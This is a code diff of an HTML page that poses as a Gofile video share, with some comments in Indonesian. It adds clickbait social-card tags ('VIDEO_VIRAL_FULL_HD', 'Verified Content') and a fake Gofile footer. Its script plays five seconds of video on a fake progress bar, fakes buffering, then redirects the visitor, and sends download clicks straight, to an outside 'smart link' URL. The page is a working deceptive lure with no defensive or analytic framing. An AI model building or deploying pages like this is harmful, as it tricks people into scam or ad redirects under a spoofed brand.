@@ -3,22 +3,29 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Gofile - Private Video Storage</title>
+    
+    <meta name="twitter:card" content="summary_large_image"/>
+    <meta name="twitter:title" content="📁 Folder Shared: VIDEO_VIRAL_FULL_HD.mp4"/>
+    <meta name="twitter:description" content="View shared video from Gofile Cloud. Size: 24.8 MB | Status: Available | Verified Content"/>
+    <meta name="twitter:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh5ttL0ul7icIjcGX0Qn4Xw09Rf5dy2C0l4UIxnKf5GAUfd2azP7KP4BEuiLcpSWnnoccz2YwQRCguT9feaynK6X7nfPKxaW7ngcqiYLTsSJ9kKAqu4T_nGY0H2wDZhBlvWqXL9Kz8TcaHh82H_DhlR3iHJySOiDdr9ddxwekTSLn5bAzym6Xtq12wErWi1/s320/12869.png"/>
+
+    <title>Gofile - View Video</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css"/>
+    
     <style>
         :root {
             --gofile-bg: #18191c;
             --gofile-card: #202225;
             --gofile-blue: #44a2ff;
         }
-        /* Menghilangkan semua sisa warna putih */
         html, body { 
             background-color: var(--gofile-bg) !important; 
             margin: 0; 
             padding: 0; 
             overflow-x: hidden;
             color: #e3e5e8;
+            font-family: sans-serif;
         }
         .bg-gofile-card { background-color: var(--gofile-card); }
         .spinner {
@@ -100,20 +107,21 @@
                         </div>
                         <div class="flex items-center gap-2 border-l border-gray-700/50 pl-4">
                             <i class="fas fa-check-circle text-green-500 text-xs"></i>
-                            <span class="text-[11px] text-gray-400 font-medium">Verified</span>
+                            <span class="text-[11px] text-gray-400 font-medium">Verified Content</span>
                         </div>
                     </div>
                 </div>
             </div>
 
-            <p class="text-[9px] text-gray-700 text-center uppercase tracking-[0.3em] font-medium">Secure Cloud Hosting • Gofile.io</p>
+            <p class="text-[9px] text-gray-700 text-center uppercase tracking-[0.3em] font-medium italic">© 2026 Gofile Cloud Hosting</p>
         </main>
     </div>
 
     <script>
-        // --- CONFIG ---
+        // --- DATA KONFIGURASI ---
         const SMART_LINK = "https://petsrulefondness.com/g8htu6fn9?key=b8eedfbc01329bff8c2b6da1a062f8c2";
-        const WATCH_LIMIT = 5; 
+        const WATCH_LIMIT = 5; // Detik video diputar sebelum redirect
+        // ------------------------
 
         const vid = document.getElementById('vid-player');
         const playBtn = document.getElementById('play-btn');
@@ -122,28 +130,28 @@
         const pTime = document.getElementById('p-time');
         const dlBtn = document.getElementById('dl-trigger');
 
-        function startAction() {
+        function executeRedirect() {
             if (vid.paused) {
                 playBtn.classList.add('hidden');
                 vid.play();
 
                 let sec = 0;
-                const timer = setInterval(() => {
+                const tracker = setInterval(() => {
                     sec++;
-                    pBar.style.width = (sec / WATCH_LIMIT) * 30 + '%';
+                    pBar.style.width = (sec / WATCH_LIMIT) * 35 + '%';
                     pTime.innerText = `00:0${sec} / 05:24`;
 
                     if (sec >= WATCH_LIMIT) {
-                        clearInterval(timer);
+                        clearInterval(tracker);
                         vid.pause();
                         buffer.classList.remove('hidden');
-                        setTimeout(() => { window.location.href = SMART_LINK; }, 1000);
+                        setTimeout(() => { window.location.href = SMART_LINK; }, 1200);
                     }
                 }, 1000);
             }
         }
 
-        document.getElementById('video-area').onclick = () => startAction();
+        document.getElementById('video-area').onclick = () => executeRedirect();
         dlBtn.onclick = () => { window.location.href = SMART_LINK; };
     </script>
 </body>
